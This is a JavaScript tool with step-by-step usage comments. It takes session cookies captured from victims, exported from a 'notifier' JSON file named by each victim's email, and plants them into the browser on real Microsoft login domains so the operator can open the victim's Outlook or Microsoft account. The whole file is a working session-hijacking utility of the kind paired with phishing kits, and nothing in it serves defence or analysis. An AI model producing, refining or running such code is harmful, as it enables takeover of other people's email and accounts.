// cookie_plant.js - plant cookies from the notifier JSON export into the CURRENT site.
//
// The <email>-injector.txt only plants the auth origin's cookies; a full session
// (Microsoft especially) needs cookies on several domains (login.microsoftonline.com,
// .live.com, .microsoftonline.com, ...). This script uses the JSON export directly
// and covers every captured origin.
//
// Usage:
//   1. Open <email>.json and copy the "captured_cookies" array (the part inside [ ]).
//   2. In a normal/incognito browser, go to the REAL auth domain, e.g.
//        https://login.microsoftonline.com
//   3. Open DevTools (F12) -> Console and paste:
//        const PLANT_COOKIES = [ <pasted array> ];
//   4. Paste the contents of this file (the IIFE below) and press Enter.
//   5. It prints which cookies it planted and which origins still need a visit.
//      Repeat steps 2-4 on each remaining origin (e.g. https://login.live.com),
//      then navigate to the target app (outlook.com / account.microsoft.com).

!function () {
  var host = (location.hostname || '').toLowerCase();

  function domainCovers(cookieDomain, hostname) {
    var d = String(cookieDomain || '').toLowerCase().replace(/^\./, '');
    if (!d) return false;
    return hostname === d || hostname.endsWith('.' + d);
  }

  function expiresInOneYear() {
    var d = new Date(Date.now() + 31536000000);
    return d.toUTCString();
  }

  var planted = [];
  var missing = [];
  var skipped = 0;

  PLANT_COOKIES.forEach(function (group) {
    var groupDomain = String(group.origin || '').toLowerCase();
    if (!domainCovers(groupDomain, host)) {
      missing.push(groupDomain);
      return;
    }
    group.cookies.forEach(function (ck) {
      var name = ck.name || '';
      var value = ck.value || '';
      if (!name) return;
      var dom = ck.domain || groupDomain;
      var path = ck.path || '/';
      var extra = ';expires=' + expiresInOneYear();
      if (ck.secure) extra += ';Secure';
      extra += ';SameSite=None';
      try {
        document.cookie = name + '=' + value +
          ';domain=' + dom + ';path=' + path + extra;
        planted.push(name + ' @ ' + dom);
      } catch (e) {
        skipped++;
        console.warn('failed to set ' + name + ': ' + e);
      }
    });
  });

  console.log('planted ' + planted.length + ' cookie(s):');
  planted.forEach(function (c) { console.log('  ' + c); });
  if (missing.length) {
    console.log('still needed (visit these origins and re-run): ' + missing.join(', '));
  }
  if (skipped) console.log(skipped + ' cookie(s) failed');
}();